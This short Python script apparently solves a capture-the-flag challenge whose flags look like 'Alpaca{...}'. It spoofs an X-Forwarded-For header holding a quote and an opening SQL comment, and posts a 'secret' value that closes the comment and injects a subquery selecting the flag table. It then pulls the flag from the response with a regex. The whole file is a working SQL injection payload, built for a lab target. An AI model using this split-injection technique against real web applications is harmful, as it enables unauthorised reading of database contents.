import os
import re

import requests

URL = os.getenv("URL", "http://localhost:3000/").rstrip("/")

session = requests.Session()

response = session.post(f"{URL}/set", data={
    "secret": f"*/,(SELECT flag FROM flag))--"
}, headers={
    "X-Forwarded-For": "111'/*"
}, allow_redirects=False)

response = session.get(URL, headers={
    "X-Forwarded-For": "111"
}, allow_redirects=False)

print(re.findall(r"Alpaca\{[^}]+\}", response.text)[0])